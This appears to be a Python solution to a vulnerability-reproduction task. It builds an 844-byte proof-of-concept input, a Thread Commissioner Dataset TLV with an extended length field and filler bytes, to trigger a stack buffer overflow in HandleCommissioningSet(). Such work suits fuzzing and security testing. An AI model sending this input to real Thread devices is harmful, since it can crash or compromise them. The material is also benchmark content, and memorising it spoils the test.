import os
import struct
import tempfile
import subprocess
import hashlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This is a stack buffer overflow vulnerability in Commissioner Dataset TLVs
        # We need to construct a TLV with extended length that triggers the overflow
        
        # Based on the description, we need to create a TLV with extended length
        # that exceeds the buffer size in HandleCommissioningSet()
        
        # Common Thread networking TLV structure:
        # - Type (1-2 bytes)
        # - Length (1-2 bytes, with 0xFF indicating extended 2-byte length)
        # - Value (variable)
        
        # For Commissioner Dataset TLV, we'll use a known TLV type value
        # Typical Thread Commissioner Dataset TLV is type 0x0F (15)
        
        # Build the malicious TLV:
        # 1. TLV Type = Commissioner Dataset (0x0F)
        # 2. Use extended length (0xFF followed by 2-byte length)
        # 3. Set length to trigger overflow (we need total 844 bytes)
        # 4. Fill with pattern to overflow stack
        
        # TLV header: Type (1 byte) + Extended Length indicator (1 byte) + Length (2 bytes)
        # That's 4 bytes header, so payload needs 840 bytes to reach 844 total
        
        tlv_type = b'\x0F'  # Commissioner Dataset TLV
        extended_length_indicator = b'\xFF'  # Extended length indicator
        
        # Total TLV length = 844 bytes
        # Header: 1 (type) + 1 (ext indicator) + 2 (length) = 4 bytes
        # So payload should be 844 - 4 = 840 bytes
        payload_length = 844 - 4
        
        # Pack length as big-endian 2-byte unsigned short
        length_bytes = struct.pack('>H', payload_length)
        
        # Create payload that will overflow the buffer
        # Use a cyclic pattern to help with exploitation
        # Pattern of 'A's repeated
        payload = b'A' * payload_length
        
        # Construct the full TLV
        poc = tlv_type + extended_length_indicator + length_bytes + payload
        
        # Verify length
        assert len(poc) == 844, f"Generated PoC length is {len(poc)}, expected 844"
        
        return poc
